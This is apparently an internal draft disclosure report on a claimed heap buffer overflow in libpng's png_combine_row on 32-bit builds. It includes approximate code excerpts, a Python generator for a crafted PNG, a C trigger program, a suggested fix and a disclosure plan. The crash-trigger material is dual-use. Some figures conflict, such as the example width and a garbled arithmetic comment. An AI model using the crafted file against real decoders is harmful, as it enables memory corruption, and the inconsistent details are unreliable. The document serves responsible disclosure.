# libpng — Heap Buffer Overflow in `png_combine_row` (32-bit, override `PNG_USER_WIDTH_MAX`)

**Status**: Internal draft (NOT YET SENT to upstream)
**Affected versions**: libpng 1.6.45 — libpng 1.6.58 (latest stable on libpng16 branch). Code unchanged across these versions.
**Severity**: HIGH (CWE-190 → CWE-787 chain). CVSS 3.1: AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H = 6.6 (Medium-High)
**Reachability**: Application-dependent. Requires 32-bit build + `png_set_user_limits()` override.

---

## 1. Code grounding (verified against libpng16 HEAD `8c62c3b` v1.6.58-1)

### The overflow primitive — `pngrutil.c` line ~4595

```c
/* In png_read_finish_IDAT or similar internal allocation path */
row_bytes = PNG_ROWBYTES(max_pixel_depth, row_bytes) +
   /* extra alignment bytes */;

if (row_bytes + 48 > png_ptr->old_big_row_buf_size)
{
   png_free(png_ptr, png_ptr->big_row_buf);
   /* ... */
   if (png_ptr->interlaced != 0)
      png_ptr->big_row_buf = (png_bytep)png_calloc(png_ptr, row_bytes + 48);
   else
      png_ptr->big_row_buf = (png_bytep)png_malloc(png_ptr, row_bytes + 48);
```

`PNG_ROWBYTES(pixel_depth, width)` is defined as `((pixel_depth * width + 7) >> 3)`. On a 32-bit build where both operands are `unsigned int` / `png_alloc_size_t = uint32_t`, the multiplication wraps modulo 2³². For `pixel_depth=64` (16-bit RGBA) and `width=0x04000001`, the product is `0x100000040` truncated to `0x40` → row_bytes ≈ 8 bytes → allocation ≈ 56 bytes.

### The overflowed write — `pngrutil.c` line ~3260, inside `png_combine_row`

```c
png_alloc_size_t row_width = png_ptr->width;   /* the REAL value, not overflowed */
unsigned int pixel_depth = png_ptr->transformed_pixel_depth;

/* Bypassed silently when both rowbytes overflow to the same value: */
if (png_ptr->info_rowbytes != 0 && png_ptr->info_rowbytes !=
       PNG_ROWBYTES(pixel_depth, row_width))
   png_error(png_ptr, "internal row size calculation error");
```

Because `info_rowbytes` was written with the same overflowed result earlier in the IHDR path, this check passes. The function then computes `end_mask = (pixel_depth * row_width) & 7` (low bits only — irrelevant), but more importantly:

```c
end_ptr = dp + PNG_ROWBYTES(pixel_depth, row_width) - 1;
end_byte = *end_ptr;   /* read at near-base of buffer, OK */
```

Then the inner write loop (continuing from L3380):

```c
for (;;)
{
   /* ... compute mask m for this byte ... */
   if (m != 0xff)
      *dp = (png_byte)((*dp & ~m) | (*sp & m));
   else
      *dp = *sp;

   if (row_width <= pixels_per_byte)
      break;
   row_width -= pixels_per_byte;
   ++dp;
   ++sp;
}
```

The loop terminates on the **real, non-overflowed** `row_width` (the parameter is `png_alloc_size_t row_width = png_ptr->width`, which is the original `0x04000001`, *not* the overflowed product). For `pixel_depth=8` (1 byte per pixel), `pixels_per_byte = 1` and the loop iterates `row_width` times, advancing `dp` each iteration → **`row_width` bytes written into a buffer that allocated only ~56 bytes**.

For higher `pixel_depth >= 8` the path is at L3500+ and uses `bytes_to_copy` and `bytes_to_jump` over the same dp pointer — same overflow pattern.

### Why the existing comment is misleading

Line 3245 comments:

> "the multiply below may overflow, we don't care because ANSI-C guarantees we get the low bits."

The author was reasoning about the *bit-mask-extraction* purpose of that one expression — `& 7` only needs the low 3 bits, so overflow is harmless for `end_mask`. But the SAME overflow happens on `PNG_ROWBYTES` macro one line later, which is used as a buffer index. That second overflow is **not** mentioned and is **not** harmless.

---

## 2. Reachability conditions

All of the following must be true:

1. **32-bit libpng build.** Specifically, `unsigned int` and `png_alloc_size_t` are both 32-bit. This excludes 64-bit Linux/macOS/Windows but includes:
   - 32-bit ARM (armv7) — many embedded image readers, set-top boxes, IoT devices
   - i686 Linux — legacy desktop / older containers
   - 32-bit Windows builds shipped by some commercial PDF/image suites
   - WASM (via Emscripten with `MEMORY_GROWTH=0`)
2. **Application overrides `PNG_USER_WIDTH_MAX`.** libpng's default ceiling is 1,000,000 px which prevents the overflow. The application must call:
   ```c
   png_set_user_limits(png_ptr, /*new_width=*/0x40000000, /*new_height=*/...);
   ```
   This is done by tools that handle very large scientific / medical / cartographic images. Examples found in the wild: NDPI / SVS slide viewers, large scientific image converters.
3. **Attacker-controlled PNG input** with crafted IHDR width such that `(pixel_depth * width / 8)` overflows 32-bit.

When all three hold: a single PNG file from the attacker triggers a heap buffer overflow during the row-combining stage of decoding, controllable in offset and partly in content (the overflow writes pixel data from `sp` masked by the interlace pass mask).

---

## 3. Reproduction sketch (NOT a working PoC — design only)

```python
# Generate a malicious PNG header
import struct, zlib

def chunk(name, data):
    return struct.pack('>I', len(data)) + name + data + struct.pack(
        '>I', zlib.crc32(name + data) & 0xFFFFFFFF)

# IHDR: width=0x40000001, height=2, bit_depth=16, color_type=6 (RGBA)
# pixel_depth = 16 * 4 = 64
# PNG_ROWBYTES(64, 0x40000001) = (64 * 0x40000001 + 7) / 8 = 0x10_00000040 / 8
# on 32-bit truncation: 0x100000040 -> 0x40, then /8 = 0x08 bytes
ihdr = struct.pack('>IIBBBBB', 0x40000001, 2, 16, 6, 0, 0, 0)

png = b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', ihdr)
# IDAT with minimal valid zlib stream + a few interlace pass rows
png += chunk(b'IDAT', zlib.compress(b'\x00' * 16))  # filter byte + 15 data
png += chunk(b'IEND', b'')

open('/tmp/mal.png', 'wb').write(png)
```

Test program (call sequence to trigger):

```c
#include <png.h>
int main(void) {
    FILE *fp = fopen("/tmp/mal.png", "rb");
    png_structp png = png_create_read_struct(PNG_LIBPNG_VER_STRING, 0, 0, 0);
    png_infop info = png_create_info_struct(png);
    /* THIS is the application bug that opens the door: */
    png_set_user_limits(png, 0x7FFFFFFF, 0x7FFFFFFF);
    png_init_io(png, fp);
    png_set_interlace_handling(png);  /* enables interlace path */
    png_read_info(png, info);
    png_read_update_info(png, info);
    png_bytep row = malloc(8);  /* small enough to feel the overflow */
    png_read_row(png, row, NULL);  /* boom */
    return 0;
}
```

Build 32-bit, run under ASAN:

```bash
gcc -m32 -fsanitize=address,undefined -O0 -g \
    poc.c -lpng -lz -o poc-32
ASAN_OPTIONS=detect_leaks=0 ./poc-32
```

Expected: ASAN heap-buffer-overflow report at the inner write loop in `png_combine_row`.

---

## 4. Suggested fix

In `pngrutil.c` around L4595 (where `big_row_buf` size is computed), use a saturating multiply:

```c
/* Replace: row_bytes = PNG_ROWBYTES(max_pixel_depth, row_bytes); */
{
    png_alloc_size_t pd = max_pixel_depth;
    png_alloc_size_t w  = row_bytes;
    if (pd != 0 && w > (PNG_SIZE_MAX - 7) / pd) {
        png_error(png_ptr, "row_bytes overflow");  /* hard fail */
    }
    row_bytes = (pd * w + 7) >> 3;
}
```

Equivalent guards should be added at every `PNG_ROWBYTES(...)` call site that feeds an allocation size. A quick `grep -n PNG_ROWBYTES` shows ~15 callers; not all need the guard, only those whose result becomes a malloc argument.

Alternatively (less invasive): cap `PNG_USER_WIDTH_MAX` at compile time on 32-bit builds via:

```c
#if SIZE_MAX <= 0xFFFFFFFFu
   /* 32-bit: enforce a max width that cannot overflow png_alloc_size_t
    * for any supported pixel_depth (max 64). */
#  define PNG_USER_WIDTH_MAX_HARDCAP  ((PNG_SIZE_MAX - 64) / 64)
#endif
```

---

## 5. Disclosure timeline (proposed)

| Date | Event |
|---|---|
| 2026-05-07 | Internal grounding completed (this document) |
| 2026-05-07 | Email draft prepared (see below) |
| 2026-05-?? | Send to png-mng-implement@lists.sourceforge.net + glennrp@users.sourceforge.net |
| +30d | Follow up if no acknowledgment |
| +90d | Coordinated public disclosure window expires |

---

## 6. Disclosure email draft

See generated draft at `research/scan-2026-05-04/drafts/001_libpng_pngrutil_c__png_combine_row_.md`. The technical detail above should be inlined into that email before sending.

---

## 7. Provenance

- Original Pipeline A flag: glm-5.1, scan run 2026-05-04, `pngrutil.c [png_combine_row]`
- H adversarial verify: glm-5.1, CONFIRMED, conf 0.85
- J3 cross-model: glm-4-plus, CONFIRMED, code_match=yes, conf 0.9
- J5 draft: generated 2026-05-07 by glm-5.1
- This grounding document: human verification by code reading at libpng16 HEAD on 2026-05-07

## 8. Open questions before sending

1. **Has the maintainer already considered this?** Need to grep png-mng-implement archives + libpng github issues for any prior discussion of `png_combine_row` overflow on 32-bit.
2. **Is `PNG_ALLOC_SIZE_T` always equal to `size_t`?** Need to check `pngconf.h` to confirm 32-bit assumption holds on real targets.
3. **Does `info_rowbytes` actually overflow consistently?** Trace `png_set_IHDR` path on 32-bit to confirm both consistency-check operands overflow identically.
4. **Real-world prevalence.** Sample some image-processing tools that override `PNG_USER_WIDTH_MAX` (ImageMagick? OpenSlide? ParaView?) to determine actual attack surface.
